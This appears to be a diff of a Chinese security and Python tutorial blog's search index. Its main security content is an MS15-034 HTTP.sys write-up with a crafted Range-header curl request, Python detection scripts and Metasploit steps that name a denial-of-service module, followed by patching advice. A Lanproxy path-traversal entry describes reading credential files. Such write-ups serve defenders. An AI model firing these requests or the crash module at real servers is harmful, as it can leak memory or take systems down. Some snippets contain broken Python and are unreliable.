-<h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，<br>也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码</p>
-<h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>为了更好的处理中文，不和ASCII冲突，中国制定了GB2312编码，用来把中文编进去</p>
-<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了<br>Unicode编码转化为“可变长编码”的UTF-8编码。<br>UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，<br>常用的英文字母被编码成1个字节，汉字通常是3个字节，<br>如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间</p>
-<p>在计算机内存中，统一使用Unicode编码，保存或者传输的时候使用UTF-8编码<br>用记事本编辑的时候从文件读取的UTF-8字符被转换为Unicode字符到内存里，<br>编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件<br>对于单个字符的编码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python提供了：</span><br><span class="line"><span class="built_in">ord</span>()函数获取字符的整数表示，<span class="built_in">chr</span>()函数把编码转换为对应的字符</span><br><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="comment">#65</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">66</span>)	<span class="comment">#&#x27;B&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">25991</span>)	<span class="comment">#&#x27;文&#x27;</span></span><br><span class="line">如果知道字符的整数编码，还可以用十六进制这么写<span class="built_in">str</span></span><br><span class="line"><span class="string">&#x27;\u4e2d\u6587&#x27;</span>	<span class="comment"># &#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>python中，字符串类型是str，在内存中以Unicode表示，一个字符对应若干字节<br>如果要保存或者传输，就需要把str变为以字节为单位的bytes</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;xxx&#x27;</span> <span class="comment">#用来表示bytes类型的数据</span></span><br><span class="line"></span><br><span class="line">以Unicode 表示的<span class="built_in">str</span>通过 encode()方法可以编码为指定的<span class="built_in">bytes</span></span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)	<span class="comment"># b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)	<span class="comment"># b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">要把<span class="built_in">bytes</span>变为<span class="built_in">str</span>，就需要用decode()方法</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>个中文字符经过UTF-<span class="number">8</span>编码后通常会占用<span class="number">3</span>个字节，而<span class="number">1</span>个英文字符只占用<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-类与对象</title>
     <url>//06163ddbafa1.html</url>
     <content><![CDATA[<h2 id="对象-object"><a href="#对象-object" class="headerlink" title="对象(object)"></a>对象(object)</h2><p>对象是内存中专门存储数据的一块区域</p>
@@ -1729,6 +1751,30 @@
 
 <h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>多态是面向对象的三大特征之一<br>一个对象可以以不同形态呈现</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        self._name = name</span><br><span class="line"></span><br><span class="line">a = A(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">b = B(<span class="string">&#x27;猪八戒&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你好 %s&#x27;</span>%obj.name)</span><br><span class="line"></span><br><span class="line">say_hello(a)</span><br><span class="line">say_hello(b)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-流程控制语句</title>
+    <url>//f68e861f37cd.html</url>
+    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
+
+<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -2118,6 +2164,31 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-编码</title>
+    <url>//609542bd1343.html</url>
+    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>计算机在设计时采用8个比特（bit）作为一个字节（byte），<br>所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），<br>如果要表示更大的整数，就必须用更多的字节</p>
+<h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，<br>也就是大小写英文字母、数字和一些符号，这个编码表被称为ASCII编码</p>
+<h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>为了更好的处理中文，不和ASCII冲突，中国制定了GB2312编码，用来把中文编进去</p>
+<h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了<br>Unicode编码转化为“可变长编码”的UTF-8编码。<br>UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，<br>常用的英文字母被编码成1个字节，汉字通常是3个字节，<br>如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间</p>
+<p>在计算机内存中，统一使用Unicode编码，保存或者传输的时候使用UTF-8编码<br>用记事本编辑的时候从文件读取的UTF-8字符被转换为Unicode字符到内存里，<br>编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件<br>对于单个字符的编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python提供了：</span><br><span class="line"><span class="built_in">ord</span>()函数获取字符的整数表示，<span class="built_in">chr</span>()函数把编码转换为对应的字符</span><br><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="comment">#65</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">66</span>)	<span class="comment">#&#x27;B&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">25991</span>)	<span class="comment">#&#x27;文&#x27;</span></span><br><span class="line">如果知道字符的整数编码，还可以用十六进制这么写<span class="built_in">str</span></span><br><span class="line"><span class="string">&#x27;\u4e2d\u6587&#x27;</span>	<span class="comment"># &#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>python中，字符串类型是str，在内存中以Unicode表示，一个字符对应若干字节<br>如果要保存或者传输，就需要把str变为以字节为单位的bytes</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;xxx&#x27;</span> <span class="comment">#用来表示bytes类型的数据</span></span><br><span class="line"></span><br><span class="line">以Unicode 表示的<span class="built_in">str</span>通过 encode()方法可以编码为指定的<span class="built_in">bytes</span></span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)	<span class="comment"># b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)	<span class="comment"># b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是bytes。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">要把<span class="built_in">bytes</span>变为<span class="built_in">str</span>，就需要用decode()方法</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>个中文字符经过UTF-<span class="number">8</span>编码后通常会占用<span class="number">3</span>个字节，而<span class="number">1</span>个英文字符只占用<span class="number">1</span>个字节</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lanproxy任意文件读取-CVE-2021-3019</title>
     <url>//0e7fcf3b35d4.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
@@ -2194,6 +2265,44 @@
       </tags>
   </entry>
   <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>常见漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HPP参数污染漏洞</title>
     <url>//4189faf9a367.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
@@ -2247,102 +2356,6 @@
       </categories>
       <tags>
         <tag>低危漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span 